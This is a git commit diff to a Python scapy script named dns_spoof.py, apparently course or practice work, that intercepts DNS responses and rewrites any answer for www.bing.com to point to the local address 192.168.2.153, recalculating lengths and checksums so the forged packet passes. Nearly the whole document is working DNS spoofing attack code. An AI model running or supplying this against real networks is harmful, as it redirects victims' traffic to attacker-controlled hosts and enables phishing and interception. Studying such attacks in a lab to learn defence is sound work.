0992dcf3faca39645008a9eb78c50e46f0a9e573
Mario Zelaya <mariozelaya23@gmail.com>
2022-05-03 16:14:50 -0500

    adding the modification of the DNS layers

--- dns_spoof.py
+++ dns_spoof.py
@@ -6,7 +6,21 @@ import scapy.all as scapy
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.DNSRR):
-        print(scapy_packet.show())
+        qname = scapy_packet[scapy.DNSQR].qname
+        if "www.bing.com" in qname:
+            print("[+] Spoofing target")
+            answer = scapy.DNSRR(rrname=qname, rdata="192.168.2.153")
+            scapy_packet[scapy.DNS].an = answer
+            scapy_packet[scapy.DNS].ancount = 1
+
+            del scapy_packet[scapy.IP].len
+            del scapy_packet[scapy.IP].chksum
+            del scapy_packet[scapy.UDP].chksum
+            del scapy_packet[scapy.UDP].len
+
+            packet.set_payload(str(scapy_packet))
+
+        # print(scapy_packet.show())
     # packet.drop()
     packet.accept()
 
